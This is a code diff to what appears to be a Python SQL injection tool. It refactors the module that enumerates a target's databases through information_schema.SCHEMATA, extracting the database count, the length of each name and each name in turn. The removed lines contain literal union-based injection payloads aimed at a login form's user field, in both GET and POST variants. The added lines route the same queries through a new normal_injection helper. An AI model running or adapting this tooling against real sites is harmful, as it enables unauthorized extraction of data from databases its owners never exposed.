@@ -6,6 +6,7 @@ from test import SqliTest
 from tqdm import trange
 from lib.dealpayload import build_injection
 from lib.dealpayload import time_injection
+from lib.dealpayload import normal_injection
 
 __author__ = "LoRexxar"
 
@@ -29,11 +30,13 @@ class SqliDatabases(SqliTest):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database amount sqli...")
                 # 先注databases的数量
-                # payload = "user=ddog123' union SELECT 1,COUNT(SCHEMA_NAME) from information_schema.SCHEMATA  limit 0,1%23&passwd=ddog123&submit=Log+In"
-                payload = self.dealpayload.construct_normal_payload(select='COUNT(SCHEMA_NAME)',
-                                                                    source='information_schema.SCHEMATA')
-                r = self.Data.GetData(payload)
-                databases_number = int(UnpackFunction(r))
+
+                databases_number = normal_injection(select='COUNT(SCHEMA_NAME)',
+                                                    source='information_schema.SCHEMATA',
+                                                    dealpayload=self.dealpayload,
+                                                    data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                    )
+
                 logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                 print "[*] databases_number: %d" % databases_number
 
@@ -41,23 +44,26 @@ class SqliDatabases(SqliTest):
                 for i in trange(int(databases_number), desc="Database sqli...", leave=False, disable=True):
                     # 首先是database name的长度
                     logger.debug("Start %dth database length sqli..." % (i + 1))
-                    # payload = "user=ddog123' union SELECT 1,length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
-                    #     i) + ",1%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_normal_payload(select='length(SCHEMA_NAME)',
-                                                                        source='information_schema.SCHEMATA', limit=i)
-                    r = self.Data.GetData(payload)
-                    databases_name_len = int(UnpackFunction(r))
+
+                    databases_name_len = normal_injection(select='length(SCHEMA_NAME)',
+                                                          source='information_schema.SCHEMATA',
+                                                          limit=i,
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
 
                     # 然后注database name
                     logger.debug("Start %dth database name sqli..." % (i + 1))
-                    # payload = "user=ddog123' union SELECT 1,SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
-                    #     i) + ",1%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_normal_payload(select='SCHEMA_NAME',
-                                                                        source='information_schema.SCHEMATA', limit=i)
-                    r = self.Data.GetData(payload)
-                    databases_name = UnpackFunction(r)
+
+                    databases_name = normal_injection(select='SCHEMA_NAME',
+                                                      source='information_schema.SCHEMATA', limit=i,
+                                                      dealpayload=self.dealpayload,
+                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                      )
+
                     logger.debug(
                         "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))
 
@@ -178,40 +184,39 @@ class SqliDatabases(SqliTest):
                 logger.debug("Start database amount sqli...")
 
                 # 先注databases的数量
-                # payload = {
-                #     "user": "ddog123' union SELECT 1,COUNT(SCHEMA_NAME) from information_schema.SCHEMATA  limit 0,1#",
-                #     "passwd": "ddog123"}
-                payload = self.dealpayload.construct_normal_payload(select='COUNT(SCHEMA_NAME)',
-                                                                    source='information_schema.SCHEMATA')
-                r = self.Data.PostData(payload)
-                databases_number = int(UnpackFunction(r))
+
+                databases_number = normal_injection(select='COUNT(SCHEMA_NAME)',
+                                                    source='information_schema.SCHEMATA',
+                                                    dealpayload=self.dealpayload,
+                                                    data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                    )
+
                 logger.debug("Databases account sqli success...The databases_number is %d..." % databases_number)
                 print "[*] databases_number: %d" % databases_number
 
                 # 每个循环跑一次databases的数据
                 for i in trange(int(databases_number), desc="Database sqli...", leave=False, disable=True):
                     # 首先是database name的长度
-                    # payload = {
-                    #     "user": "ddog123' union  SELECT 1,length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
-                    #         i) + ",1#", "passwd": "ddog123&submit=Log+In"}
-                    payload = self.dealpayload.construct_normal_payload(select='length(SCHEMA_NAME)',
-                                                                        source='information_schema.SCHEMATA',
-                                                                        limit=i)
-                    r = self.Data.PostData(payload)
-                    databases_name_len = int(UnpackFunction(r))
+
+                    databases_name_len = normal_injection(select='length(SCHEMA_NAME)',
+                                                          source='information_schema.SCHEMATA',
+                                                          limit=i,
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
 
                     # 然后注database name
                     logger.debug("Start %dth database name sqli..." % (i + 1))
-                    # payload = {
-                    #     "user": "ddog123' union SELECT 1,SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
-                    #         i) + ",1#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_normal_payload(select='SCHEMA_NAME',
-                                                                        source='information_schema.SCHEMATA',
-                                                                        limit=i)
-                    r = self.Data.PostData(payload)
-                    databases_name = UnpackFunction(r)
+
+                    databases_name = normal_injection(select='SCHEMA_NAME',
+                                                      source='information_schema.SCHEMATA', limit=i,
+                                                      dealpayload=self.dealpayload,
+                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                      )
+
                     logger.debug(
                         "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))
 
